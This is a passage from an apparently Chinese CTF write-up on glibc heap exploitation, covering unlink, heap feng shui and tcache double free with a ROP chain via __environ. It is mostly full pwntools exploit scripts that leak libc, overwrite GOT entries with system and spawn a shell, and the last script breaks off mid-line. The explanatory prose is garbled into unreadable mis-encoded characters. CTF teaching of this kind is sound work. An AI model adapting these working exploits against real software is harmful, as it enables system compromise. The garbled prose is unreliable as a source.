<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27629</span>)<span class="hljs-comment">#process(&#x27;./stkof&#x27;) # </span><br>e = ELF(<span class="hljs-string">&#x27;./stkof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="hljs-comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span></span>):<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">b&#x27;OK&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span> ,size:<span class="hljs-built_in">int</span> ,content</span>):<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">b&#x27;OK&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0x10</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x20</span>) <span class="hljs-comment"># idx 2</span><br>    new(<span class="hljs-number">0x80</span>) <span class="hljs-comment"># idx 3</span><br>    new(<span class="hljs-number">0x10</span>) <span class="hljs-comment"># idx 4</span><br>    edit(<span class="hljs-number">2</span>, <span class="hljs-number">0x30</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0x602140</span> + <span class="hljs-number">0x10</span> - <span class="hljs-number">0x18</span>) + p64(<span class="hljs-number">0x602140</span> + <span class="hljs-number">0x10</span> - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x90</span>))<br>    free(<span class="hljs-number">3</span>)<br>    edit(<span class="hljs-number">2</span>, <span class="hljs-number">0x28</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]) + p64(<span class="hljs-number">0x602138</span>) + p64(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>    edit(<span class="hljs-number">1</span>, <span class="hljs-number">0x8</span>, p64(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>    free(<span class="hljs-number">3</span>)<br><br>    puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    edit(<span class="hljs-number">2</span>, <span class="hljs-number">0x28</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]) + p64(<span class="hljs-number">0x602138</span>) + p64(libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()))<br>    edit(<span class="hljs-number">1</span>, <span class="hljs-number">0x8</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    free(<span class="hljs-number">3</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/87TAZSdY15jgbIP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="ä¸ƒã€å †é£æ°´ï¼ˆHeap-Fengshuiï¼‰"><a href="#ä¸ƒã€å †é£æ°´ï¼ˆHeap-Fengshuiï¼‰" class="headerlink" title="ä¸ƒã€å †é£æ°´ï¼ˆHeap Fengshuiï¼‰"></a>ä¸ƒã€å †é£æ°´ï¼ˆHeap Fengshuiï¼‰</h2><p>æ‰€è°“å †é£æ°´ä¹Ÿå«ä½œå †æ’å¸ƒï¼Œå…¶å®è¯´ä¸¥æ ¼äº†å¹¶ä¸æ˜¯ä¸€ç§æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œè€Œæ˜¯<strong>ä¸€ç§çµæ´»å¸ƒç½®å †å—æ¥æ§åˆ¶å †å¸ƒå±€çš„æ–¹æ³•</strong>ï¼Œåœ¨ä¸€äº›ä¸€äº›å…¶ä»–æ¼æ´çš„åˆ©ç”¨ä¸­èµ·åˆ°æ•ˆæœ </p>
<p>å †é£æ°´ä¸€è¯æºäºä¸­å›½é“æ•™çš„â€œé£æ°´â€ä¸€è¯ï¼Œè¿™ä¸ªè¯æ— æ³•å¾ˆå¥½åœ°è¢«ç¿»è¯‘ä¸ºè‹±æ–‡æ•…ç›´æ¥å–å…¶æ‹¼éŸ³</p>
<blockquote>
<p>Pwnæ‰‹äººäººéƒ½æ˜¯é£æ°´å¤§å¸ˆï¼ˆè¯¯ï¼‰</p>
</blockquote>
<h4 id="ä¾‹é¢˜ï¼šbabyfengshui-33c3-2016-heap-arrangement-got-table-hijack"><a href="#ä¾‹é¢˜ï¼šbabyfengshui-33c3-2016-heap-arrangement-got-table-hijack" class="headerlink" title="ä¾‹é¢˜ï¼šbabyfengshui_33c3_2016 - heap arrangement + got table hijack"></a>ä¾‹é¢˜ï¼šbabyfengshui_33c3_2016 - heap arrangement + got table hijack</h4><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºåˆ†é…å †å—æ—¶æ‰€ç”Ÿæˆçš„å¤§è‡´ç»“æ„åº”å½“å¦‚ä¸‹ï¼Œä¸”<strong>è¯¥ç»“æ„ä½“mallocçš„å¤§å°ä¸º0x80ï¼Œå¤„åœ¨unsorted bin èŒƒå›´å†…</strong></p>
<p><img src="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¼æ´ç‚¹åœ¨äºå¯¹è¾“å…¥é•¿åº¦çš„æ£€æµ‹ï¼Œå®ƒæ˜¯æ£€æµ‹çš„æ˜¯<strong>æˆ‘ä»¬æ‰€è¾“å…¥çš„é•¿åº¦æ˜¯å¦å¤§äºä»description chunkçš„addråˆ°struct chunkçš„prev_sizeçš„é•¿åº¦</strong></p>
<p><img src="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨å¸¸è§„æƒ…å†µä¸‹æˆ‘ä»¬ä¼¼ä¹åªèƒ½å¤Ÿè¦†å†™æ‰PREV_SIZEçš„ä¸€éƒ¨åˆ†ï¼Œä¸ç—›ä¸ç—’</p>
<p>ä½†æ˜¯è€ƒè™‘è¿™æ ·çš„ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬å…ˆåˆ†é…ä¸¤ä¸ªå¤§å—ï¼ˆchunk<em>4ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå—çš„sizeè¦åœ¨unsortedèŒƒå›´å†…ï¼‰ï¼Œä¹‹åé‡Šæ”¾æ‰ç¬¬ä¸€ä¸ªå¤§å—ï¼Œå†åˆ†é…ä¸€ä¸ªsizeæ›´å¤§çš„å—ï¼Œunsorted binå†…å°±ä¼šä»è¿™ä¸ªå¤§chunkï¼ˆç”±ä¸¤ä¸ªchunkåˆå¹¶è€Œæ¥ï¼‰ä¸­åˆ‡å‰²ä¸€ä¸ªå¤§chunkç»™åˆ°descriptionï¼Œä¹‹åå†ä»ä¸‹æ–¹çš„top chunkåˆ‡å‰²0x90æ¥ç»™åˆ°structï¼Œè¿™ä¸ªæ—¶å€™*<em>ç”±äºå¯¹lengthçš„é”™è¯¯åˆ¤å®šå°±ä¼šå¯¼è‡´æˆ‘ä»¬æœ‰æœºä¼šè¦†å†™ç¬¬äºŒä¸ªå¤§å—ä¸­çš„å†…å®¹</em></em></p>
<p><img src="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ•…è€ƒè™‘å…ˆè¦†å†™ç¬¬äºŒä¸ªå¤§å—ä¸­çš„ description addr ä¸º free@got åæ³„æ¼å‡º libc çš„åŸºå€ï¼Œåå†ä¿®æ”¹ free@got ä¸º system å‡½æ•°åœ°å€åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º<code>&quot;/bin/sh&quot;</code>çš„ chunk å³å¯é€šè¿‡ <code>system(&quot;/bin/sh&quot;)</code> æ¥ get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span>) <span class="hljs-comment"># remote(&#x27;node3.buuoj.cn&#x27;,26486)</span><br>e = ELF(<span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">command:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Action: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(command).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, name, length:<span class="hljs-built_in">int</span>, descryption</span>):<br>    cmd(<span class="hljs-number">0</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;size of description: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;name: &quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">b&quot;text length: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(length).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;text: &quot;</span>)<br>    p.sendline(descryption)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span>, length:<span class="hljs-built_in">int</span>, descryption</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;text length: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(length).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;text: &quot;</span>)<br>    p.sendline(descryption)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>) <span class="hljs-comment"># idx 2</span><br>    free(<span class="hljs-number">0</span>)<br><br>    big_size = <span class="hljs-number">0x80</span> + <span class="hljs-number">8</span> + <span class="hljs-number">0x80</span><br>    padding_length = <span class="hljs-number">0x80</span> + <span class="hljs-number">8</span> + <span class="hljs-number">0x80</span> + <span class="hljs-number">8</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">8</span><br>    new(big_size, <span class="hljs-string">&quot;arttnba3&quot;</span>, padding_length + <span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * padding_length + p32(e.got[<span class="hljs-string">&#x27;free&#x27;</span>])) <span class="hljs-comment"># idx 3</span><br>    show(<span class="hljs-number">1</span>)<br><br>    p.recvuntil(<span class="hljs-string">b&quot;description: &quot;</span>)<br>    free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br>    libc_base = free_addr - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>    edit(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, p32(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    free(<span class="hljs-number">2</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="å…«ã€ROP-in-heap-exploit"><a href="#å…«ã€ROP-in-heap-exploit" class="headerlink" title="å…«ã€ROP in heap exploit"></a>å…«ã€ROP in heap exploit</h2><p>åœ¨å †é¢˜çš„ä¸–ç•Œå¹¶éåªèƒ½å¤Ÿé€šè¿‡åŠ«æŒå„ç§ hook æ¥è¾¾åˆ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„æ•ˆæœï¼Œä¼ <strong>ç»Ÿçš„åœ¨æ ˆä¸Šæ„é€  ROP é“¾çš„æ–¹å¼ä»æ—§æœªè¿‡æ—¶</strong>ï¼Œåˆ©ç”¨å„ç§ pwn æŠ€å·§æˆ‘ä»¬ä»æ—§å¯ä»¥é€šè¿‡åœ¨æ ˆä¸Šæ„é€  ROP é“¾çš„æ–¹å¼æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p>
<h3 id="environ"><a href="#environ" class="headerlink" title="__environ"></a>__environ</h3><p><code>__environ</code> æ˜¯ä¸€ä¸ª<strong>ä¿å­˜äº†æ ˆä¸Šå˜é‡åœ°å€çš„ç³»ç»Ÿå˜é‡</strong>ï¼Œä½äº libc ä¸­ï¼Œåˆ©ç”¨ gdb è°ƒè¯•æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¾—çŸ¥å…¶ä¸æ ˆä¸Šåœ°å€é—´çš„åç§»ï¼Œä»¥æ­¤åœ¨æ ˆä¸Šæ„é€  ROP é“¾åŠ«æŒç¨‹åºæ‰§è¡Œæµ</p>
<h4 id="ä¾‹é¢˜ï¼šminiLCTF2020-heap-master-tcache-double-free-use-after-free-orw"><a href="#ä¾‹é¢˜ï¼šminiLCTF2020-heap-master-tcache-double-free-use-after-free-orw" class="headerlink" title="ä¾‹é¢˜ï¼šminiLCTF2020 - heap_master - tcache double free(use after free) + orw"></a>ä¾‹é¢˜ï¼šminiLCTF2020 - heap_master - tcache double free(use after free) + orw</h4><p> <a href="/download/minil/pwn/pwn%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">ç‚¹å‡»ä¸‹è½½-pwn</a> </p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°é™¤äº†åœ°å€éšæœºåŒ–ä»¥å¤–éƒ½å¼€ä¸Šäº†</p>
<p><img src="https://i.loli.net/2020/11/15/biBCsTKHSuj4l9f.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/11/15/sFaTZAYb5oqDU3I.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç¨‹åºæœ¬èº«æœ‰ç€åˆ†é…å †å—ã€é‡Šæ”¾å †å—ã€è¾“å‡ºå †å—å†…å®¹çš„åŠŸèƒ½</p>
<p>æˆ‘ä»¬å‘ç°åœ¨<code>delete()</code>å‡½æ•°ä¸­<code>free()</code>å<strong>å¹¶æ²¡æœ‰å°†ç›¸åº”å †å—æŒ‡é’ˆç½®0ï¼Œå­˜åœ¨UAF</strong></p>
<p><img src="https://i.loli.net/2020/11/15/Ua3OnZdlLFswe48.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é¢˜ç›®æç¤ºlibcå¯èƒ½æ˜¯2.23ä¹Ÿå¯èƒ½æ˜¯2.27ï¼Œå°è¯•<strong>ç›´æ¥è¿›è¡Œdouble freeï¼Œå‘ç°ç¨‹åºæ²¡æœ‰å´©æºƒ</strong>ï¼Œæ•…å¯çŸ¥æ˜¯æ²¡æœ‰double freeæ£€æŸ¥çš„2.27çš„tcache</p>
<blockquote>
<p>libc2.29åtcacheåŠ å…¥double freeæ£€æŸ¥</p>
</blockquote>
<p><img src="https://i.loli.net/2020/11/15/yF7H8SBxf9mJcAb.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨<code>main()</code>å‡½æ•°å¼€å¤´çš„<code>init()</code>å‡½æ•°ä¸­è°ƒç”¨äº†<code>prctl()</code>å‡½æ•°ï¼Œé™åˆ¶äº†æˆ‘ä»¬ä¸èƒ½å¤Ÿgetshell<img src="https://i.loli.net/2020/11/19/q3Jaw8BfEYjGUNd.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é¦–å…ˆæˆ‘ä»¬æƒ³åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå¡«æ»¡tcacheï¼Œä¹‹ååˆ†é…ä¸€ä¸ªunsorted binèŒƒå›´çš„chunkï¼Œé€šè¿‡æ‰“å°è¯¥chunkçš„å†…å®¹è·å–<strong>main_arena + 0x60</strong>çš„åœ°å€ï¼Œ<strong>è¿›è€Œè·å¾—libcçš„åœ°å€</strong></p>
<p>è™½ç„¶æˆ‘ä»¬ä¸èƒ½å¤Ÿ getshellï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥é€šè¿‡ double free è¿›è¡Œä»»æ„åœ°å€å†™ï¼Œ<del>æ¯•ç«ŸCTFé¢˜ç›®çš„è¦æ±‚æ˜¯å¾—åˆ°flagï¼Œä¸ä¸€å®šè¦å¾—åˆ°shellï¼Œ</del>æ•…è€ƒè™‘<strong>é€šè¿‡ environ å˜é‡æ³„æ¼å‡ºæ ˆåœ°å€ååœ¨æ ˆä¸Šæ„é€  rop é“¾è¿›è¡Œ orw è¯»å‡ºflag</strong></p>
<p>é€šè¿‡åŠ¨æ€è°ƒè¯•æˆ‘ä»¬å®¹æ˜“å¾—åˆ°<code>___environ</code>ä¸<code>new()</code>ä¸­çš„è¿”å›åœ°å€é—´è·ç¦»ä¸º0x220ï¼Œ<strong>å°†ropé“¾å†™åˆ°è¿™ä¸ªè¿”å›åœ°å€ä¸Šå³å¯æ¥æ”¶åˆ°flag</strong></p>
<p><img src="https://i.loli.net/2020/11/20/auVAHxCbtO6IUjm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2020/11/20/ULcoXK4GiISg6Vb.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>) <span class="hljs-comment"># p = remote(&#x27;pwn.challenge.lctf.online&#x27;,10042)</span><br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br>note_addr = <span class="hljs-number">0x6020c0</span><br>flag_addr = e.bss() + <span class="hljs-number">0x500</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;size?&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;content?&#x27;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;index ?&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;index ?&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p.recvuntil(<span class="hljs-string">b&#x27;what is your name? &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 2</span><br>    new(<span class="hljs-number">0xb0</span>, <span class="hljs-string">&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 3</span><br><br>    <span class="hljs-comment"># fill the tcache</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-comment"># unsorted bin leak libc addr</span><br>    delete(<span class="hljs-number">1</span>)<br>    dump(<span class="hljs-number">1</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x60</span><br>    malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] <span class="hljs-comment"># 0x3cbc30</span><br>    environ = libc_base + libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>] <span class="hljs-comment"># 0x3ee098</span><br>    pop_rdi_ret = libc_base + 